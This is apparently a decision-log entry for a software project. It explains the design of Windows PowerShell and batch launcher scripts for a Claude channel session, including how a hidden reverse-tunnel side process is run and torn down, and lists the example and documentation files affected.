- **Windows specifics (baked-in, don't regress):** PowerShell + a `.bat` ExecutionPolicy shim (not pure cmd — native JSON / `Get-NetTCPConnection` / PID-tree teardown). The reverse tunnel runs as a **`-WindowStyle Hidden`** side process torn down by PID tree — `Minimized` (`SW_SHOWMINIMIZED`) activates the window and a delayed child steals focus. A Git-Bash-style `COORD_CONFIG` (`/c/…`) is normalized to `<drive>:/…`.
- **Scope:** Windows shipped as validated reference scripts (Sola PM validated end-to-end), not the "documented recipe only" originally floated — a working script beats a recipe given the force-fit hazard, and they exist. Marker base aligned cross-platform via DL-156 (`os.tmpdir()`).
- **Consequences:** `examples/start-channel-session.sh` (rewritten self-resolving + HTTP), `examples/start-claude.ps1` + `examples/start-claude.bat` (new), `CLAUDE_DEPLOYMENT.md` ("The canonical channel launcher" + "Multi-agent channel-server distribution" reconcile, FR-3). Examples + docs only — no app code, schema, migration, or `.env` change. The deployed operator launchers get the same operational sync (outside the repo). Pairs with DL-156.
